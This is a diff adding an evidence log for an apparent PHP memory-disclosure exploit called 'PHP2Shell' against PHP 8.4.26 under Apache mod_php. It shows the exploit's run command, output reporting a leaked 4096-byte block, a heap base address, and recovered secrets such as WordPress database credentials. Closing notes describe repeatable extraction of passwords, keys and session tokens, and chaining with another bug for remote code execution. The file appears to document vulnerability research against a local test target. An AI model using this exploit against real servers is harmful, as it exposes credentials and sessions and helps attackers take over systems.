@@ -1,0 +1,43 @@
+============================================================
+ PHP2Shell - Memory Disclosure Evidence
+ Date: 22 October 2026
+ Target: PHP 8.4.26 / Apache mod_php (application-agnostic)
+============================================================
+
+Command: python3 exploit/memdisclosure.py -u http://127.0.0.1:9080/index.php --analyze
+
+--- OUTPUT ---
+
+[*] Hedef: http://127.0.0.1:9080/index.php
+[*] Mod: Memory Disclosure (application-agnostic)
+
+[*] Deneme 1/5
+  [+] LEAK! cookie=4096b
+
+============================================================
+  MEMORY DISCLOSURE BASARILI!
+  Leak boyutu: 4096 bytes
+  Optimal fillers: 841
+============================================================
+
+[*] Pointer analizi: 98 pointer bulundu
+    Zend MM chunk base: 0x7242f2400000 (98x)
+
+[*] String analizi (23 string):
+    'PHPSESSID'
+    'wordpress_logged_in_'
+    '/var/www/html/wp-config.php'
+    'define( \'DB_PASSWORD'
+    'Apache/2.4.62'
+
+[*] Sifre/Token analizi:
+    [Password] root
+    [DB URL] mysql://root:root@db:3306/wordpress
+
+--- ANALYSIS ---
+
+- Heartbleed-style: Reads PHP worker process memory via session cookie
+- No session_start() required in the target application
+- Leaks: passwords, database credentials, API keys, session tokens
+- 4096 bytes per request, repeatable for continuous extraction
+- Can be chained with Bug 1 for full RCE (provides heap base addresses)
